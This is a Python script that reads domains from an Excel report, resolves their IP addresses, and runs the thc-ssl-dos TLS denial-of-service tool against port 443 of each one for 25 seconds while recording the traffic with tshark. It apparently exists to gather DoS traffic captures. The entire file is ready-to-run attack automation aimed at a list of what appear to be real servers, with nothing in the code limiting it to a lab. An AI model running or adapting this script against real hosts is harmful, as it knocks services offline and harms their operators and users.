# This script is used to get data from excel dos traffic to input to a linux machine
import os
import pandas as pd
import datetime
import socket
import logging
import subprocess
import time
import signal

logging.basicConfig(filename='dos_traffic.log', level=logging.INFO, format='%(asctime)s-%(levelname)s-%(message)s')

excel_dir = "./report_unique_servers2.xlsx"
df = pd.read_excel(excel_dir, sheet_name="thc-tls-dos")

domains = []
failed_domain = []

domain = df['Domain']

for row in domain:
    if row not in domains:
        domains.append(row)
    else:
        continue


file_path = os.path.join("output/dos_traffic/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
if not os.path.exists(file_path):
    os.makedirs(file_path)


def clean_domain(url):
    if "https://" in url:
        result = url[8:]
    elif "http://" in url:
        result = url[7:]
    else:
        result = url

    if "/" in result:
        result = result.split("/")[0]

    return result


# For each website: resolve the IP address to add into kali-linux thc-ssl-dos
for website in domains:
    domain_socket = clean_domain(website)

    # Getting list of possible ip from the particular domain
    ip_list = []
    try:
        socket_info = socket.getaddrinfo(domain_socket, None)
    except socket.gaierror as e:
        logging.error(str(e) + " " + str(domain_socket))
        failed_domain.append(domain_socket)
        continue

    # Appending possible IP to input from the domain
    for info in socket_info:
        ip = info[4][0]
        if ip not in ip_list and ":" not in ip:
            ip_list.append(ip)

    logging.info("Testing this IP " + ip_list[0])

    # Initializer for tshark
    # SNIFFER
    # Declaring variables for the sniffer
    # Capture filter ip_list[0] is taken as the first IP resolved to capture
    # Might not be too perfect in the case
    abspath = os.path.abspath(file_path)
    interface = "eth0"
    capture_filter = "tcp port 443 and host " + ip_list[0]
    temp = domain_socket.rfind(".")
    web_name = domain_socket[:temp]
    filename = abspath + "/" + web_name + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"

    # Raw capturing
    sniff_command = ["tshark", "-i", interface, "-c 10000", "-f", capture_filter, "-w", filename]
    sniff_process = subprocess.Popen(sniff_command, shell=False)
    logging.info("Opened tshark sniffer")

    # Initializer for thc-ssl-dos
    # Declaring variables for thc-ssl-dos
    parallel_connections = 20
    port = 443

    thc_command = "thc-ssl-dos -l " + str(parallel_connections) + " " + ip_list[0] + " " + str(port) + " " + "--accept"
    GNULL = open(os.devnull, 'w')
    thc_process = subprocess.Popen(thc_command, shell=True, stdout=GNULL)
    logging.info("Opened DOS attack")

    # Sleeping for 10 seconds before killing them off
    time.sleep(25)
    kill_thc = "killall -s SIGTERM thc-ssl-dos"
    kill_sniff = "killall -s SIGTERM  tshark"
    os.system(kill_thc)
    os.system(kill_sniff)

